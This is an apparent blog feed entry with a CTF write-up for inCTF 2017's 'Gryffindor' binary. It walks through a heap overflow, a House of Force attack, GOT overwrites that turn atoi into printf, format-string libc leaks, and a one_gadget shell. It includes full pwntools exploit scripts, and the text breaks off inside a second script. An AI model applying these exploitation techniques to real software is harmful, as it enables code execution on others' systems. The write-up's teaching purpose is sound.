  
  <entry>
    <title>[Pwn] inCTF 2017 - Gryffindor</title>
    <link href="https://teamrocketist.github.io/2018/11/08/Pwn-inCTF-2017-Gryffindor/"/>
    <id>https://teamrocketist.github.io/2018/11/08/Pwn-inCTF-2017-Gryffindor/</id>
    <published>2018-11-08T06:21:03.000Z</published>
    <updated>2018-11-26T01:11:07.210Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://mega.nz/#!XvInEABK!7R3-Hbl7dGY-7FGVuTxP25NkQfd5OQBn6P9thxk3l7U" target="_blank" rel="noopener">gryffindor</a><br><a href="https://mega.nz/#!z3An1Y5b!eY7eK3OYBLU3jFtOq3ZUrwiXWJzw2UGXyVOJDDS4qn8" target="_blank" rel="noopener">libc.so.6</a></p><p>I’ve been looking at attacks on the heap lately, since I didn’t do any kind of write-up about this I ended up looking for an old ctf challenge from inCTF 2017, I did solved this challenge some days after the ctf (not during it) but back in the day I didn’t have the time to do a write about this.</p><p>The binary in this challenge was an <strong>ELF 64-bit</strong>, first thing we are likely to look up is for it’s security:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec gryffindor</span><br><span class="line">[*] <span class="string">'/ctf/work/ctf/inctf2017/pwn/gryffindor/gryffindor'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO </span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure></p><p>Now after this we want to run the binary itself so we can see what it does, the application present us with a menu which gives us 4 options: </p><ol><li>We can create a new item where we can specify the input <strong>allocation size</strong> and the <strong>index</strong>. </li><li>We can delete an item by stipulating it’s <strong>index</strong>.</li><li>We can edit an item by indicating it’s <strong>index</strong> then we can modify it’s content by giving it a size and the string itself.</li><li>Finally we have an option to exit the binary</li></ol><p>By checking the <strong>add</strong> for option 1 we can already see some interesting things : </p><p><a data-fancybox="gallery" href="https://i.imgur.com/e6qQoth.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/e6qQoth.png" alt=""><br></a></p><p>Now checking the <strong>delete</strong> option 2, doesn’t look we have any kind of vulnerabilities:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/cDtma4l.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/cDtma4l.png" alt=""><br></a></p><p>Finally on option 3 <strong>edit</strong> we can find a <strong>heap overflow</strong> vulnerability:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/nkup5nJ.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/nkup5nJ.png" alt=""><br></a></p><h2 id="House-of-Force-the-Jedi-Overflow"><a href="#House-of-Force-the-Jedi-Overflow" class="headerlink" title="House of Force the Jedi Overflow"></a>House of Force the Jedi Overflow</h2><p>This attack focuses on making <strong>malloc</strong> return an arbitrary pointer, we can achieve this by exploiting the <strong>top_chunk</strong>… The top most chunk also known as the ‘wilderness’. This assumes an overflow into the top chunk’s header (we have an overflow as we saw in option 3), if we can overflow and modify the top_chunk <strong>size</strong> into a very large value, all the initial requests will be services using the top chunk, instead of relying on <strong>mmap</strong>. If we set it into <strong>-1</strong> this will be evaluated into <strong>0xFFFFFFFFFFFFFFFF</strong> in a 64 bit binary.</p><p>Assuming we as the attackers want to make make <strong>malloc</strong> to return an address <strong>p</strong>, after we set the size into <strong>-1</strong> any malloc call with the size of <strong>P- &amp;top_chunk</strong> will return <strong>P</strong> as a pointer to that address.</p><p>If we force <strong>malloc</strong> to return a pointer of our choice we will gain an arbitrary write to that address.</p><p>The Ingredients to perform this attack can be looked as follows:</p><ul><li>The exploiter must be able to overwrite the top chunk (i.e. the overflow must happen in a chunk that allows to overwrite the wilderness).</li><li>There is a malloc() call with an exploiter-controllable size.</li><li>There is another malloc() call where data are controlled by the exploiter.</li><li>A leaked heap address so we can calculate the size required to force malloc return the address we want.</li></ul><p>As we can look above we have almost everything, the only thing’s missing is the last point we don’t have any heap address leaked and after our analysis there isn’t any kind of vulnerability to leak any kind of addresses… Well we missed this function:<br><a data-fancybox="gallery" href="https://i.imgur.com/xel89OL.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/xel89OL.png" alt=""><br></a><br>As we can see above the author of the challenge was nice enough to give us the a leak for free.</p><h2 id="Replace-atoi-with-printf-for-format-string-vulnerability"><a href="#Replace-atoi-with-printf-for-format-string-vulnerability" class="headerlink" title="Replace atoi with printf for format string vulnerability"></a>Replace atoi with printf for format string vulnerability</h2><p>Now that we have all the ingredients we can put <strong>house of force</strong> into practice, first lets write some functions <strong>add</strong> and <strong>edit</strong> options, and extract the heap address:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_g</span><span class="params">(size, index)</span>:</span></span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(<span class="string">'1'</span>)</span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(size)</span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(index)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_g</span><span class="params">(size, index, inp, choice=<span class="string">'3'</span>)</span>:</span></span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(choice)</span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(index)</span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(size)</span><br><span class="line">    r.sendline(inp)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line">binary = ELF(<span class="string">'./gryffindor'</span>)</span><br><span class="line">libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line">r = process(<span class="string">'./gryffindor'</span>, env=&#123;<span class="string">'LD_LIBRARY_PATH'</span>: os.path.join(os.getcwd(),<span class="string">"./libc.so.6"</span>)+<span class="string">" "</span>+sys.path[<span class="number">0</span>]&#125;)</span><br><span class="line"><span class="comment">#gdb.attach(r, """</span></span><br><span class="line"><span class="comment">#   b *0x400bd9</span></span><br><span class="line"><span class="comment">#   """)</span></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">'1337'</span>)</span><br><span class="line">heap = int(r.recv(<span class="number">9</span>),<span class="number">16</span>)+<span class="number">0x1b0</span></span><br><span class="line">log.info(<span class="string">'[X] LEAKED HEAP 0x%x'</span> % (heap))</span><br><span class="line">add_g(<span class="string">'130'</span>, <span class="string">'0'</span>)</span><br></pre></td></tr></table></figure><p>The 0x1b0 offset which is offset to <strong>top_chunk</strong> can be calculated as follows:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/CKTIig9.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/CKTIig9.png" alt=""><br></a></p><p><strong>Overflowing wilderness size</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">###############################################################################</span></span><br><span class="line"><span class="comment"># HOUSE OF FORCE</span></span><br><span class="line">add_g(<span class="string">'130'</span>, <span class="string">'0'</span>)</span><br><span class="line">edit_g(str(<span class="number">18</span>*<span class="number">8</span>), <span class="string">'0'</span>,<span class="string">'A'</span>*<span class="number">17</span>*<span class="number">8</span> + p64(<span class="number">-1</span>,signed=<span class="keyword">True</span>))</span><br></pre></td></tr></table></figure></p><p>Looking at the heap after we overflow it:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/E5n4gQ9.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/E5n4gQ9.png" alt=""><br></a></p><p>Now we can force <strong>malloc</strong> to return the pointer <strong>P</strong> we need by just passing the calculation <strong>P - &amp;top_chunk</strong> as the size, after this the next <strong>malloc</strong> will return the pointer we want:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">###############################################################################</span></span><br><span class="line"><span class="comment"># HOUSE OF FORCE - Replace atoi with printf to gain format string vulnerability</span></span><br><span class="line">add_g(<span class="string">'130'</span>, <span class="string">'0'</span>)</span><br><span class="line">edit_g(str(<span class="number">18</span>*<span class="number">8</span>), <span class="string">'0'</span>,<span class="string">'A'</span>*<span class="number">17</span>*<span class="number">8</span> + p64(<span class="number">-1</span>,signed=<span class="keyword">True</span>))</span><br><span class="line">add_g(str(binary.got[<span class="string">'atoll'</span>]-top_chunk), <span class="string">'1'</span>)</span><br><span class="line">add_g(<span class="string">'130'</span>, <span class="string">'2'</span>) <span class="comment"># this malloc will return got address of atoll</span></span><br><span class="line">edit_g(<span class="string">'130'</span>, <span class="string">'2'</span>, p64(binary.plt[<span class="string">'atoll'</span>]+<span class="number">6</span>) +</span><br><span class="line">    p64(binary.plt[<span class="string">'malloc'</span>]+<span class="number">6</span>) +</span><br><span class="line">    p64(binary.plt[<span class="string">'setvbuf'</span>]+<span class="number">6</span>) +</span><br><span class="line">    p64(binary.plt[<span class="string">'printf'</span>]+<span class="number">6</span>))</span><br></pre></td></tr></table></figure><p>The look on gdb after executing <strong>malloc</strong>:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/QEJDPzY.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/QEJDPzY.png" alt=""><br></a></p><p><strong>atoll</strong> and <strong>atoi</strong> are different functions they almost do the same thing yet they are being used in different places in the binary, the one we want is actually <strong>atoi</strong>, you must be asking why didn’t I used <strong>house of force</strong> on the <strong>atoi</strong> address, well when I was using the <strong>atoi</strong> address with house of force for some reason I was getting an segmentation fault, can’t really explain why because I didn’t understand it, well if you know why this happens feel free to write in the comments I would really appreciate that. To circumvent this I used the <strong>atoll</strong> GOT, we can still overwrite <strong>atoi</strong> but we will need to override other got addresses because <strong>malloc</strong>, <strong>setvbuf</strong> are between them as you can see bellow:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/CzM2iJi.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/CzM2iJi.png" alt=""><br></a></p><p>So to not break the binary we should not override them with junk so thats why i’m setting it to their <strong>plts</strong> in this line of code:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">edit_g(<span class="string">'130'</span>, <span class="string">'2'</span>, p64(binary.plt[<span class="string">'atoll'</span>]+<span class="number">6</span>) +</span><br><span class="line">    p64(binary.plt[<span class="string">'malloc'</span>]+<span class="number">6</span>) +</span><br><span class="line">    p64(binary.plt[<span class="string">'setvbuf'</span>]+<span class="number">6</span>) +</span><br><span class="line">    p64(binary.plt[<span class="string">'printf'</span>]+<span class="number">6</span>))</span><br></pre></td></tr></table></figure><p>Now that we override the <strong>atoi</strong> GOT with the printf PLT we can use format_string to leak addresses from the stack:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">####################################################</span></span><br><span class="line"><span class="comment"># LEAK LIBC</span></span><br><span class="line">r.recv()</span><br><span class="line">time.sleep(<span class="number">0.1</span>)</span><br><span class="line">r.sendline(<span class="string">'%p %p %p'</span>)</span><br><span class="line">s = r.recv()</span><br><span class="line">list_addr = s.split(<span class="string">' '</span>)</span><br><span class="line">STACK_ADDRESS = int(list_addr[<span class="number">0</span>],<span class="number">16</span>)+<span class="number">168</span><span class="number">-32</span><span class="number">-32</span></span><br><span class="line">leaked = int(list_addr[<span class="number">2</span>][:<span class="number">-8</span>].rstrip(),<span class="number">16</span>)</span><br><span class="line">LIBC_BASE = leaked<span class="number">-0xf7260</span></span><br><span class="line">SYSTEM = LIBC_BASE + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">ONE_GADGET = LIBC_BASE + <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">ONE_GADGET_LOW = ONE_GADGET &amp; <span class="number">0xffffffff</span></span><br><span class="line">ONE_GADGET_HIGH = (ONE_GADGET &amp; <span class="number">0xffffffff00000000</span>) &gt;&gt; <span class="number">32</span></span><br><span class="line">log.info(<span class="string">'[X] LEAKED 0x%x'</span> % (leaked))</span><br><span class="line">log.info(<span class="string">'[X] LEAKED LIBC_BASE 0x%x'</span> % LIBC_BASE)</span><br><span class="line">log.info(<span class="string">'[X] LEAKED STACK_ADDRESS 0x%x'</span> % STACK_ADDRESS)</span><br><span class="line">log.info(<span class="string">'[X] LEAKED SYSTEM 0x%x'</span> % SYSTEM)</span><br><span class="line">log.info(<span class="string">'[X] LEAKED LOW_ONE_GADGET 0x%x'</span> % ONE_GADGET_LOW)</span><br><span class="line">log.info(<span class="string">'[X] LEAKED HIGH_ONE_GADGET 0x%x'</span> % ONE_GADGET_HIGH)</span><br><span class="line"></span><br><span class="line"><span class="comment">####################################################</span></span><br></pre></td></tr></table></figure><p>After printf is executed, if we leak the first 3 addresses from the stack we can see the 1st one is an address from the stack and the 3rd is an address from <strong>libc</strong>, we can calculate the offset to the by using gdb</p><p><a data-fancybox="gallery" href="https://i.imgur.com/mwWbfyZ.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/mwWbfyZ.png" alt=""><br></a></p><h2 id="Spawning-a-shell"><a href="#Spawning-a-shell" class="headerlink" title="Spawning a shell"></a>Spawning a shell</h2><p>I ended up doing this in two ways: </p><ol><li>Overwriting <strong>exit GOT address</strong> with <strong>one_gadget</strong> by using format string.</li><li>Overwriting <strong>atoi GOT address</strong> (now printf) with <strong>system</strong> from libc, and send <strong>/bin/sh</strong> as string.</li></ol><p>I will explain the first one since it’s a little more difficult and the 2nd is just a repetition of what we did before with the only difference of <strong>atoi</strong> is now <strong>printf</strong>, which can complicate a little bit the things:</p><h3 id="Format-String"><a href="#Format-String" class="headerlink" title="Format String"></a>Format String</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">ONE_GADGET = LIBC_BASE + <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">ONE_GADGET_LOW = ONE_GADGET &amp; <span class="number">0xffffffff</span></span><br><span class="line">ONE_GADGET_HIGH = (ONE_GADGET &amp; <span class="number">0xffffffff00000000</span>) &gt;&gt; <span class="number">32</span></span><br><span class="line">r.send(<span class="string">'%&#123;&#125;x%9$hn'</span>.format(ONE_GADGET_HIGH)+</span><br><span class="line">    <span class="string">'A'</span>*<span class="number">12</span>+p64(binary.got[<span class="string">'exit'</span>]+<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line">ONE_GADGET_LOW0 = ONE_GADGET_LOW &gt;&gt; <span class="number">16</span></span><br><span class="line">ONE_GADGET_LOW1 = ONE_GADGET_LOW &amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line">r.send(<span class="string">'%&#123;&#125;x%9$hn'</span>.format(ONE_GADGET_LOW0)+</span><br><span class="line">    <span class="string">'A'</span>*<span class="number">12</span>+p64(binary.got[<span class="string">'exit'</span>]+<span class="number">2</span>))</span><br><span class="line">r.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">'%&#123;&#125;x%9$hn'</span>.format(ONE_GADGET_LOW1)+</span><br><span class="line">    <span class="string">'A'</span>*<span class="number">12</span>+p64(binary.got[<span class="string">'exit'</span>]))</span><br><span class="line">r.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">'%7$llnCC'</span>+</span><br><span class="line">    p64(STACK_ADDRESS)) <span class="comment"># sets the one_gadget constraint to null</span></span><br><span class="line">r.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">time.sleep(<span class="number">0.3</span>)</span><br><span class="line">r.sendline(<span class="string">'111'</span>) <span class="comment"># sends option 4 to exit the program</span></span><br><span class="line">                  <span class="comment"># atoi is now printf, the return value</span></span><br><span class="line">                  <span class="comment"># of printf is the number of characters</span></span><br><span class="line">                  <span class="comment"># printed so if we want option 4 we need</span></span><br><span class="line">                  <span class="comment"># to send 4 chars, in this case 3 "1s" and</span></span><br><span class="line">                  <span class="comment"># "\n" new line character</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>I separated the <strong>one_gadget</strong> from libc address in 3 parts so it’s easier to perform the format string, I won’t explain how I did it in detail, if you want to learn how to do a format string in detail you can check my other write up <a href="https://teamrocketist.github.io/2017/09/25/Pwn-BackdoorCTF-2017-baby0x41414141/">here</a>, to get the offset for the one_gadget you can use this <a href="https://github.com/david942j/one_gadget" target="_blank" rel="noopener">tool</a>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ one_gadget libc.so.6 </span><br><span class="line">0x45216execve(<span class="string">"/bin/sh"</span>, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526aexecve(<span class="string">"/bin/sh"</span>, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf0274execve(<span class="string">"/bin/sh"</span>, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1117execve(<span class="string">"/bin/sh"</span>, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure><p>I used the offset <strong>0x4526a</strong> it has a constraint in rsp+0x30, we can use once again format string to set this constraints to null, since we leaked a stack address before we can calculate the offset from the leaked adress with the same trick we used to calculate the offset to <strong>libc_base</strong> by using gdb.</p><p>The full exploit using format string</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_g</span><span class="params">(size, index)</span>:</span></span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(<span class="string">'1'</span>)</span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(size)</span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(index)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_g</span><span class="params">(size, index, inp, choice=<span class="string">'3'</span>)</span>:</span></span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(choice)</span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(index)</span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(size)</span><br><span class="line">    r.sendline(inp)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line">binary = ELF(<span class="string">'./gryffindor'</span>)</span><br><span class="line">libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line">r = process(<span class="string">'./gryffindor'</span>, env=&#123;<span class="string">'LD_LIBRARY_PATH'</span>: os.path.join(os.getcwd(),<span class="string">"./libc.so.6"</span>)+<span class="string">" "</span>+sys.path[<span class="number">0</span>]&#125;)</span><br><span class="line"><span class="comment">#gdb.attach(r, """</span></span><br><span class="line"><span class="comment">#   b *0x400bd9</span></span><br><span class="line"><span class="comment">#   """)</span></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">'1337'</span>)</span><br><span class="line">top_chunk = int(r.recv(<span class="number">9</span>),<span class="number">16</span>)+<span class="number">0x1b0</span></span><br><span class="line">log.info(<span class="string">'[X] LEAKED HEAP 0x%x'</span> % (top_chunk))</span><br><span class="line"></span><br><span class="line"><span class="comment">###############################################################################</span></span><br><span class="line"><span class="comment"># HOUSE OF FORCE - Replace atoi with printf to gain format string vulnerability</span></span><br><span class="line">add_g(<span class="string">'130'</span>, <span class="string">'0'</span>)</span><br><span class="line">edit_g(str(<span class="number">18</span>*<span class="number">8</span>), <span class="string">'0'</span>,<span class="string">'A'</span>*<span class="number">17</span>*<span class="number">8</span> + p64(<span class="number">-1</span>,signed=<span class="keyword">True</span>))</span><br><span class="line">add_g(str(binary.got[<span class="string">'atoll'</span>]-top_chunk), <span class="string">'1'</span>)</span><br><span class="line">add_g(<span class="string">'130'</span>, <span class="string">'2'</span>)</span><br><span class="line">edit_g(<span class="string">'130'</span>, <span class="string">'2'</span>, p64(binary.plt[<span class="string">'atoll'</span>]+<span class="number">6</span>) +</span><br><span class="line">    p64(binary.plt[<span class="string">'malloc'</span>]+<span class="number">6</span>) +</span><br><span class="line">    p64(binary.plt[<span class="string">'setvbuf'</span>]+<span class="number">6</span>) +</span><br><span class="line">    p64(binary.plt[<span class="string">'printf'</span>]+<span class="number">6</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">####################################################</span></span><br><span class="line"><span class="comment"># LEAK LIBC</span></span><br><span class="line">r.recv()</span><br><span class="line">time.sleep(<span class="number">0.1</span>)</span><br><span class="line">r.sendline(<span class="string">'%p %p %p'</span>)</span><br><span class="line">s = r.recv()</span><br><span class="line">list_addr = s.split(<span class="string">' '</span>)</span><br><span class="line">STACK_ADDRESS = int(list_addr[<span class="number">0</span>],<span class="number">16</span>)+<span class="number">168</span><span class="number">-32</span><span class="number">-32</span></span><br><span class="line">leaked = int(list_addr[<span class="number">2</span>][:<span class="number">-8</span>].rstrip(),<span class="number">16</span>)</span><br><span class="line">LIBC_BASE = leaked<span class="number">-0xf7260</span></span><br><span class="line">SYSTEM = LIBC_BASE + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">ONE_GADGET = LIBC_BASE + <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">ONE_GADGET_LOW = ONE_GADGET &amp; <span class="number">0xffffffff</span></span><br><span class="line">ONE_GADGET_HIGH = (ONE_GADGET &amp; <span class="number">0xffffffff00000000</span>) &gt;&gt; <span class="number">32</span></span><br><span class="line">log.info(<span class="string">'[X] LEAKED 0x%x'</span> % (leaked))</span><br><span class="line">log.info(<span class="string">'[X] LEAKED LIBC_BASE 0x%x'</span> % LIBC_BASE)</span><br><span class="line">log.info(<span class="string">'[X] LEAKED STACK_ADDRESS 0x%x'</span> % STACK_ADDRESS)</span><br><span class="line">log.info(<span class="string">'[X] LEAKED SYSTEM 0x%x'</span> % SYSTEM)</span><br><span class="line">log.info(<span class="string">'[X] LEAKED LOW_ONE_GADGET 0x%x'</span> % ONE_GADGET_LOW)</span><br><span class="line">log.info(<span class="string">'[X] LEAKED HIGH_ONE_GADGET 0x%x'</span> % ONE_GADGET_HIGH)</span><br><span class="line"></span><br><span class="line"><span class="comment">####################################################</span></span><br><span class="line"><span class="comment"># Replace exit got with one_gadget using format string</span></span><br><span class="line">r.send(<span class="string">'%&#123;&#125;x%9$hn'</span>.format(ONE_GADGET_HIGH)+</span><br><span class="line">    <span class="string">'A'</span>*<span class="number">12</span>+p64(binary.got[<span class="string">'exit'</span>]+<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line">ONE_GADGET_LOW0 = ONE_GADGET_LOW &gt;&gt; <span class="number">16</span></span><br><span class="line">ONE_GADGET_LOW1 = ONE_GADGET_LOW &amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line">r.send(<span class="string">'%&#123;&#125;x%9$hn'</span>.format(ONE_GADGET_LOW0)+</span><br><span class="line">    <span class="string">'A'</span>*<span class="number">12</span>+p64(binary.got[<span class="string">'exit'</span>]+<span class="number">2</span>))</span><br><span class="line">r.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">'%&#123;&#125;x%9$hn'</span>.format(ONE_GADGET_LOW1)+</span><br><span class="line">    <span class="string">'A'</span>*<span class="number">12</span>+p64(binary.got[<span class="string">'exit'</span>]))</span><br><span class="line">r.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">'%7$llnCC'</span>+</span><br><span class="line">    p64(STACK_ADDRESS)) <span class="comment"># sets the one_gadget constraint to null</span></span><br><span class="line">r.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">time.sleep(<span class="number">0.3</span>)</span><br><span class="line">r.sendline(<span class="string">'111'</span>) <span class="comment"># sends option 4 to exit the program</span></span><br><span class="line"><span class="comment">#####################################################</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>The exploit using house of force a 2nd time to spawn a shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 